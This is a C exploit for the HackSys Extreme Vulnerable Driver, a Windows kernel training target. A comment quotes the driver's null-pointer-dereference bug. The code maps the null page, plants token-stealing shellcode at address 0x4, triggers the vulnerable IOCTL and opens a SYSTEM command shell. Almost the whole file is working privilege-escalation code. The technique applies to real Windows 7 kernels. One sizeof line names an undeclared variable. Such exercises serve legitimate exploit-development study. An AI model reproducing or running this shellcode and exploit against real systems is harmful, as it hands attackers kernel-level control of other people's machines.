
/*
NTSTATUS TriggerNullPointerDereference(IN PVOID UserBuffer) {
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
    PNULL_POINTER_DEREFERENCE NullPointerDereference = NULL;
 
    PAGED_CODE();
 
    __try {
        // Verify if the buffer resides in user mode
        ProbeForRead(UserBuffer,
                     sizeof(NULL_POINTER_DEREFERENCE),
                     (ULONG)__alignof(NULL_POINTER_DEREFERENCE));
 
        // Allocate Pool chunk
        NullPointerDereference = (PNULL_POINTER_DEREFERENCE)
                                  ExAllocatePoolWithTag(NonPagedPool,
                                                        sizeof(NULL_POINTER_DEREFERENCE),
                                                        (ULONG)POOL_TAG);
 
        if (!NullPointerDereference) {
            // Unable to allocate Pool chunk
            DbgPrint("[-] Unable to allocate Pool chunk\n");
 
            Status = STATUS_NO_MEMORY;
            return Status;
        }
        else {
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));
            DbgPrint("[+] Pool Size: 0x%X\n", sizeof(NULL_POINTER_DEREFERENCE));
            DbgPrint("[+] Pool Chunk: 0x%p\n", NullPointerDereference);
        }
 
        // Get the value from user mode
        UserValue = *(PULONG)UserBuffer;
 
        DbgPrint("[+] UserValue: 0x%p\n", UserValue);
        DbgPrint("[+] NullPointerDereference: 0x%p\n", NullPointerDereference);
 
        // Validate the magic value
        if (UserValue == MagicValue) {
            NullPointerDereference->Value = UserValue;
            NullPointerDereference->Callback = &NullPointerDereferenceObjectCallback;
 
            DbgPrint("[+] NullPointerDereference->Value: 0x%p\n", NullPointerDereference->Value);
            DbgPrint("[+] NullPointerDereference->Callback: 0x%p\n", NullPointerDereference->Callback);
        }
        else {
            DbgPrint("[+] Freeing NullPointerDereference Object\n");
            DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));
            DbgPrint("[+] Pool Chunk: 0x%p\n", NullPointerDereference);
 
            // Free the allocated Pool chunk
            ExFreePoolWithTag((PVOID)NullPointerDereference, (ULONG)POOL_TAG);
 
            // Set to NULL to avoid dangling pointer
            NullPointerDereference = NULL;
        }
 
#ifdef SECURE
        // Secure Note: This is secure because the developer is checking if
        // 'NullPointerDereference' is not NULL before calling the callback function
        if (NullPointerDereference) {
            NullPointerDereference->Callback();
        }
#else
        DbgPrint("[+] Triggering Null Pointer Dereference\n");
 
        // Vulnerability Note: This is a vanilla Null Pointer Dereference vulnerability
        // because the developer is not validating if 'NullPointerDereference' is NULL
        // before calling the callback function
        NullPointerDereference->Callback();
#endif
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        Status = GetExceptionCode();
        DbgPrint("[-] Exception Code: 0x%X\n", Status);
    }
 
    return Status;
}
 
'''
Ok, so we have a check on a magic value, if it succeeds we print the value and the callback function
(this is normal execution flow). If the check fails we free the pool tag and null the pointer.
Up to there there is no issue but then, in the vulnerable version, the driver simply calls the callback function without
checking if it was previously nulled!
'''
B33F

<-----------------
To Put it simply the driver calls the callback
checking if it was previously nulled, on win-7 you can map the null page, again giving the attaker
control over the kernel execution flow.
---------------->

*/


#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}
	
	char Buff[20] = "\xDD\xDD\xDD\xDD";
	DWORD u = 0;

	int b = 0x1; 
	int a = 2048; 
	int c = 0; 
	
	typedef NTSTATUS(WINAPI *pfNtAllocateVirtualMemory)(
		HANDLE ProcessHandle,
		PVOID *BaseAddress,
		ULONG_PTR ZeroBits,
		PSIZE_T AllocationSize,
		ULONG AllocationType,
		ULONG Protect
	);

	pfNtAllocateVirtualMemory NtAllocateVirtualMemory = (pfNtAllocateVirtualMemory)GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");

	c = NtAllocateVirtualMemory(
		GetCurrentProcess(),
		(PVOID *)&b,
		0,
		(PSIZE_T)&a,
		0x3000,
		0x40
	);
	char sc[60] = 
		"\x60" 
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50" 
		"\x89\xC1" 
		"\x8B\x98\xF8\x00\x00\x00" 
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00" 
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00" 
		"\x75\xED"                                        
		"\x8B\x90\xF8\x00\x00\x00" 
		"\x89\x91\xF8\x00\x00\x00" 
		"\x61" 
		"\x31\xC0" 
		"\xC3" 
		;
	LPVOID lpv = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(lpv, sc, sizeof(sc));
	LPVOID addr = &lpv;
	void * bRet = memcpy((LPVOID)0x00000004, addr, 4);
	DeviceIoControl(dev, 0x22202B, &Buff, sizeof(Buff), NULL, 0, &u, (LPOVERLAPPED)NULL);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}
